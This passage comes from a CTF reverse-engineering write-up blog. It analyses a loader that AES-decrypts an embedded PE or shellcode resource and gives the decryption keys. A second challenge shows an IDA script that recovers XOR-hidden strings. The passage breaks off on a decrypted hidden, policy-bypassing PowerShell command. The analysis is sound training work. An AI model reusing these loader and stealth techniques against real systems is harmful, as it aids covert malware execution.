class="type">int</span>)p_count);</span><br><span class="line">  <span class="built_in">AES_KEYSCHEDULE</span>((__int64)v13, (__int64)buf, &amp;src_);</span><br><span class="line">  <span class="built_in">AES_256</span>((__int64)v13, (<span class="type">char</span> *)buf_1, (<span class="type">unsigned</span> <span class="type">int</span>)p_count);</span><br><span class="line">  <span class="keyword">if</span> ( !buf_1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  n523 = <span class="built_in">sub_140003830</span>(buf_1);</span><br><span class="line">  <span class="keyword">if</span> ( n523 &amp;&amp; n523 != <span class="number">523</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(buf__1, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf__1));</span><br><span class="line">  buf__1[<span class="number">0</span>] = buf_1;</span><br><span class="line">  buf__1[<span class="number">1</span>] = (<span class="type">void</span> *)(<span class="type">unsigned</span> <span class="type">int</span>)p_count;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(buf__1[<span class="number">2</span>]) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_1400039E0</span>(buf__1);</span><br><span class="line">  <span class="keyword">if</span> ( buf__1[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free_ww</span>(buf__1[<span class="number">0</span>]);</span><br><span class="line">    buf__1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>And for the network traffic, the AES key is <code>66c9c5a2015ff2be075f3d430031f54d22f8ad7194363889a019350937946d74</code>, as the SHA256 of <code>THE-EMPEROR</code>.  And the sub_140003A50:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID __fastcall <span class="title">sub_140003A50</span><span class="params">(DWORD *p_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  hResInfo = <span class="built_in">FindResourceA</span>(<span class="number">0</span>, (LPCSTR)<span class="number">0xFE</span>, (LPCSTR)<span class="number">0xFF</span>);</span><br><span class="line">  hResData = <span class="built_in">LoadResource</span>(<span class="number">0</span>, hResInfo);</span><br><span class="line">  *p_count = <span class="built_in">SizeofResource</span>(<span class="number">0</span>, hResInfo);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">LockResource</span>(hResData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Uses the resource in file. The sub_140003830:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140003830</span><span class="params">(_DWORD *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  lp = (<span class="type">unsigned</span> __int16 *)<span class="built_in">sub_140003700</span>(buf, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !lp )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">IsBadReadPtr_w</span>(lp, <span class="number">0xF8u</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> lp[<span class="number">12</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140003700</span><span class="params">(_DWORD *buf, <span class="type">unsigned</span> __int64 n64)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n64 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">sub_140003580</span>((<span class="type">unsigned</span> __int64)buf, n64, (<span class="type">unsigned</span> __int64)buf, <span class="number">0x40u</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">IsBadReadPtr_w</span>(buf, <span class="number">0x40u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_WORD *)buf != <span class="number">0x5A4D</span> ) <span class="comment">// MZ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  n1024 = buf[<span class="number">15</span>];</span><br><span class="line">  <span class="keyword">if</span> ( n1024 &gt; <span class="number">1024</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  buf_1 = (_DWORD *)((<span class="type">char</span> *)buf + n1024);</span><br><span class="line">  <span class="keyword">if</span> ( n64 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">sub_140003580</span>((<span class="type">unsigned</span> __int64)buf, n64, (<span class="type">unsigned</span> __int64)buf_1, <span class="number">0xF8u</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">IsBadReadPtr_w</span>(buf_1, <span class="number">0xF8u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *buf_1 == <span class="number">0x4550</span> ) <span class="comment">// PE</span></span><br><span class="line">    <span class="keyword">return</span> (__int64)buf + n1024;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>So this resource after decrypt is an exe or shellcode. However, there’s no need to analyze the shellcode. The file in the traffic are also crypted with AES-256-CBC, as the first 4 bytes are key, AES key &#x3D; SHA256(KEY), iv &#x3D; 0F0E0D0C0B0A09080706050403020100.</p>
<p><font color=deepskyblue><strong>CMO{Dumb357_P3r50n_1n_7h3_M1lky_W4y_!!!}</strong></font></p>
<h3 id="A-Matter-of-Time"><a href="#A-Matter-of-Time" class="headerlink" title="A Matter of Time"></a>A Matter of Time</h3><p>The program‘s code is highly obfuscated, but the basic structures are not be changed. Debug to trace and find the chain.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x140009188</span> Start</span><br><span class="line"><span class="number">0x140017A8E</span> <span class="keyword">call</span> <span class="number">0x140009854</span> _security_init_cookie()</span><br><span class="line"><span class="number">0x140009195</span> <span class="keyword">jmp</span> <span class="number">0x1400217E4</span> __scrt_common_main_seh()</span><br><span class="line"><span class="number">0x1400217F8</span> <span class="keyword">call</span> <span class="number">0x140008CE8</span> __scrt_initialize_crt()</span><br><span class="line"><span class="number">0x14000904F</span> <span class="keyword">jp</span> <span class="number">0x14002184F</span> __scrt_common_main_seh()+<span class="number">0x43</span></span><br><span class="line"><span class="number">0x140021867</span> <span class="keyword">call</span> _initterm_e</span><br><span class="line"><span class="number">0x140009080</span> <span class="keyword">jnb</span> <span class="number">0x1400218DA</span> __scrt_common_main_seh()+<span class="number">0x6e</span></span><br><span class="line"><span class="number">0x1400218E8</span> <span class="keyword">call</span> _initterm</span><br><span class="line"><span class="comment">; → The &#x27;First_&#x27; array contains:</span></span><br><span class="line"><span class="comment">; .rdata:0x14000B4C0 dq offset 0x140008FF0</span></span><br><span class="line"><span class="comment">; .rdata:0x14000B4C8 dq offset 0x140001000</span></span><br><span class="line"><span class="comment">; 0x140008FF0:</span></span><br><span class="line"><span class="comment">; sub rsp, 0x28</span></span><br><span class="line"><span class="comment">; call addr1 → lea rcx, 0x1400097F4: TopLevelExceptionFilter; jmp SetUnhandledExceptionFilter → terminate()</span></span><br><span class="line"><span class="comment">; call addr2 → xor eax, eax</span></span><br><span class="line"><span class="comment">; mov ecx,eax</span></span><br><span class="line"><span class="comment">; add rsp, 0x28</span></span><br><span class="line"><span class="comment">; jmp _set_new_mode</span></span><br><span class="line"><span class="comment">; 0x140001000: load 96 bytes cipher → decrypt to readable hex 4c4635258cf6eca5d80b8e050a9e5b04f1a9c979bc55f3f4773971ed2f81a96967bb3569fa002f549cc970a18779b3a7</span></span><br><span class="line"><span class="number">0x1400090FC</span> <span class="keyword">jns</span> <span class="number">0x140021A28</span> __scrt_common_main_seh()+<span class="number">0xEA</span></span><br><span class="line"><span class="number">0x140021A45</span> <span class="keyword">call</span> <span class="number">0x140004290</span> main</span><br><span class="line"><span class="number">0x1400042CE</span> <span class="keyword">ja</span> <span class="number">0x14001CFD3</span> ?cout@<span class="keyword">std</span>@@3V?$basic_ostream@DU?$char_traits@D@<span class="keyword">std</span>@@@<span class="number">1</span>@A</span><br><span class="line"><span class="number">0x1400044AD</span> <span class="keyword">ja</span> <span class="number">0x14001D316</span> <span class="comment">; load cipher and decrypt</span></span><br><span class="line"><span class="number">0x14001D39F</span> <span class="keyword">call</span> <span class="number">0x1400073A8</span> print()</span><br><span class="line"><span class="number">0x14001D3A4</span> <span class="keyword">call</span> getchar()</span><br><span class="line"><span class="number">0x14001D3EB</span> <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">698FBB00h</span> <span class="comment">; cmp a value with 698FBB00h</span></span><br></pre></td></tr></table></figure>

<p>At <code>0x14001D3EB</code>, the value of eax is a value very similar to the time stamp, but it only updates once every several minutes. Debug shows that what the program accessed is a file’s time, as <code>C:\Windows\System32\winevt\Logs\System.evtx</code>.  Continue:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x14001D3F0</span> <span class="keyword">jmp</span> <span class="number">0x140004554</span></span><br><span class="line"><span class="number">0x140004554</span> <span class="keyword">jbe</span> <span class="number">0x14001D772</span> <span class="comment">; &lt; 698FBB00h ; Extra output: &quot;Ah yes, you either snuck in to review things before the CTF, or you&#x27;re just playing games with the dates. Very recreational.&quot;</span></span><br><span class="line"><span class="number">0x14000455A</span> <span class="keyword">jbe</span> <span class="number">0x14001D3F7</span></span><br><span class="line"><span class="number">0x140004560</span> <span class="keyword">ja</span> <span class="number">0x14001D41D</span> <span class="comment">; &gt; 698FBB00h</span></span><br></pre></td></tr></table></figure>

<p>Note that all printable strings in program are loaded from xmmwords to xmmregs, and the decrypt is xor single byte key + index, try to find and decrypt:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_printable</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(s) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">all</span>(c <span class="keyword">in</span> string.printable.encode() <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_with_key</span>(<span class="params">data, key</span>):</span><br><span class="line">    plain = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        k = (key + i) &amp; <span class="number">0xFF</span></span><br><span class="line">        plain.append(b ^ k)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plain)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_segment_by_name</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">for</span> seg_ea <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">        seg = idaapi.getseg(seg_ea)</span><br><span class="line">        <span class="keyword">if</span> seg <span class="keyword">and</span> idaapi.get_segm_name(seg) == name:</span><br><span class="line">            <span class="keyword">return</span> seg_ea</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_rbp_offset</span>(<span class="params">op</span>):</span><br><span class="line">    <span class="keyword">if</span> op.<span class="built_in">type</span> != idaapi.o_displ:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> op.reg != idaapi.str2reg(<span class="string">&quot;rbp&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> op.addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_extend</span>(<span class="params">value, bits=<span class="number">64</span></span>):</span><br><span class="line">    <span class="keyword">if</span> value &amp; (<span class="number">1</span> &lt;&lt; (bits - <span class="number">1</span>)):</span><br><span class="line">        value -= <span class="number">1</span> &lt;&lt; bits</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_data_from_insn</span>(<span class="params">ea</span>):</span><br><span class="line">    insn = idaapi.insn_t()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> idaapi.decode_insn(insn, ea):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    dst = insn.ops[<span class="number">0</span>]</span><br><span class="line">    src = insn.ops[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> (insn.itype == idaapi.NN_movdqa <span class="keyword">and</span></span><br><span class="line">        dst.<span class="built_in">type</span> == idaapi.o_displ <span class="keyword">and</span></span><br><span class="line">        dst.reg == idaapi.str2reg(<span class="string">&quot;rbp&quot;</span>) <span class="keyword">and</span></span><br><span class="line">        src.<span class="built_in">type</span> == idaapi.o_reg):</span><br><span class="line">        offset = sign_extend(dst.addr)</span><br><span class="line">        <span class="keyword">return</span> offset, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> (insn.itype == idaapi.NN_mov <span class="keyword">and</span></span><br><span class="line">        (dst.<span class="built_in">type</span> == idaapi.o_displ <span class="keyword">and</span> dst.reg == idaapi.str2reg(<span class="string">&quot;rbp&quot;</span>)) <span class="keyword">and</span></span><br><span class="line">        src.<span class="built_in">type</span> == idaapi.o_imm):</span><br><span class="line">        offset = sign_extend(dst.addr)</span><br><span class="line">        imm = src.value</span><br><span class="line">        dtyp = src.dtype</span><br><span class="line">        <span class="keyword">if</span> dtyp == idaapi.dt_byte:</span><br><span class="line">            data = <span class="built_in">bytes</span>([imm &amp; <span class="number">0xFF</span>])</span><br><span class="line">        <span class="keyword">elif</span> dtyp == idaapi.dt_word:</span><br><span class="line">            data = (imm &amp; <span class="number">0xFFFF</span>).to_bytes(<span class="number">2</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> dtyp == idaapi.dt_dword:</span><br><span class="line">            data = (imm &amp; <span class="number">0xFFFFFFFF</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> dtyp == idaapi.dt_qword:</span><br><span class="line">            data = (imm &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> offset, data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    seg_start = get_segment_by_name(<span class="string">&#x27;.ch&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> seg_start <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Segment &#x27;.ch&#x27; not found!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    seg = idaapi.getseg(seg_start)</span><br><span class="line">    seg_end = seg.end_ea</span><br><span class="line">    ea = seg_start</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ea &lt; seg_end:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> idaapi.is_code(idaapi.get_flags(ea)):</span><br><span class="line">            ea = idaapi.next_head(ea, seg_end)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        insn = idaapi.insn_t()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> idaapi.decode_insn(insn, ea):</span><br><span class="line">            ea = idaapi.next_head(ea, seg_end)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (insn.itype == idaapi.NN_movdqa <span class="keyword">and</span></span><br><span class="line">                insn.ops[<span class="number">0</span>].<span class="built_in">type</span> == idaapi.o_reg <span class="keyword">and</span></span><br><span class="line">                insn.ops[<span class="number">1</span>].<span class="built_in">type</span> == idaapi.o_mem):</span><br><span class="line">            ea = idaapi.next_head(ea, seg_end)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        block_data = &#123;&#125;</span><br><span class="line">        current_ea = ea</span><br><span class="line">        last_xmm_data = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> current_ea &lt; seg_end:</span><br><span class="line">            insn = idaapi.insn_t()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> idaapi.decode_insn(insn, current_ea):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> (insn.itype == idaapi.NN_movdqa <span class="keyword">and</span></span><br><span class="line">                insn.ops[<span class="number">0</span>].<span class="built_in">type</span> == idaapi.o_reg <span class="keyword">and</span></span><br><span class="line">                insn.ops[<span class="number">1</span>].<span class="built_in">type</span> == idaapi.o_mem):</span><br><span class="line">                reg_idx = insn.ops[<span class="number">0</span>].reg</span><br><span class="line">                mem_addr = insn.ops[<span class="number">1</span>].addr</span><br><span class="line">                data = idaapi.get_bytes(mem_addr, <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> data <span class="keyword">and</span> <span class="built_in">len</span>(data) == <span class="number">16</span>:</span><br><span class="line">                    last_xmm_data[reg_idx] = data</span><br><span class="line">                current_ea = idaapi.next_head(current_ea, seg_end)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (insn.itype == idaapi.NN_movdqa <span class="keyword">and</span></span><br><span class="line">                insn.ops[<span class="number">0</span>].<span class="built_in">type</span> == idaapi.o_displ <span class="keyword">and</span></span><br><span class="line">                insn.ops[<span class="number">0</span>].reg == idaapi.str2reg(<span class="string">&quot;rbp&quot;</span>) <span class="keyword">and</span></span><br><span class="line">                insn.ops[<span class="number">1</span>].<span class="built_in">type</span> == idaapi.o_reg):</span><br><span class="line">                offset = sign_extend(insn.ops[<span class="number">0</span>].addr)</span><br><span class="line">                reg_idx = insn.ops[<span class="number">1</span>].reg</span><br><span class="line">                <span class="keyword">if</span> reg_idx <span class="keyword">in</span> last_xmm_data:</span><br><span class="line">                    block_data[offset] = last_xmm_data[reg_idx]</span><br><span class="line">                current_ea = idaapi.next_head(current_ea, seg_end)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            offset, data = extract_data_from_insn(current_ea)</span><br><span class="line">            <span class="keyword">if</span> offset <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                block_data[offset] = data</span><br><span class="line">                current_ea = idaapi.next_head(current_ea, seg_end)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> block_data:</span><br><span class="line">            offsets = <span class="built_in">sorted</span>(block_data.keys())</span><br><span class="line">            min_off = offsets[<span class="number">0</span>]</span><br><span class="line">            full_data = <span class="built_in">bytearray</span>()</span><br><span class="line">            expected_off = min_off</span><br><span class="line">            <span class="keyword">for</span> off <span class="keyword">in</span> offsets:</span><br><span class="line">                gap = off - expected_off</span><br><span class="line">                <span class="keyword">if</span> gap &gt; <span class="number">0</span>:</span><br><span class="line">                    full_data.extend(<span class="string">b&#x27;\x00&#x27;</span> * gap)</span><br><span class="line">                full_data.extend(block_data[off])</span><br><span class="line">                expected_off = off + <span class="built_in">len</span>(block_data[off])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[?] Block at <span class="subst">&#123;ea:#x&#125;</span>, offsets: <span class="subst">&#123;offsets[:<span class="number">5</span>]&#125;</span><span class="subst">&#123;<span class="string">&#x27;...&#x27;</span> <span class="keyword">if</span> <span class="built_in">len</span>(offsets)&gt;<span class="number">5</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line">            solutions = []</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                plain = decrypt_with_key(full_data, key)</span><br><span class="line">                <span class="keyword">if</span> is_printable(plain):</span><br><span class="line">                    solutions.append((key, plain))</span><br><span class="line">            <span class="keyword">if</span> solutions:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Found <span class="subst">&#123;<span class="built_in">len</span>(solutions)&#125;</span> solution(s):&quot;</span>)</span><br><span class="line">                newline = <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                <span class="keyword">for</span> key, plain <span class="keyword">in</span> solutions:</span><br><span class="line">                    decoded = plain.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">                    output = <span class="built_in">repr</span>(decoded) <span class="keyword">if</span> <span class="built_in">len</span>(decoded) &gt; <span class="number">60</span> <span class="keyword">or</span> newline <span class="keyword">in</span> decoded <span class="keyword">else</span> decoded</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  Key=0x<span class="subst">&#123;key:02X&#125;</span>: <span class="subst">&#123;output&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] No printable decryption.&quot;</span>)</span><br><span class="line">        ea = current_ea <span class="keyword">if</span> block_data <span class="keyword">else</span> idaapi.next_head(ea, seg_end)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+] Done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>The strings are:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">0x14001B3A7: </span><br><span class="line">powershell -executionpolicy bypass -noninteractive -nologo -NoProfile -WindowStyle Hidden -Command &quot;Start-Sleep 1; 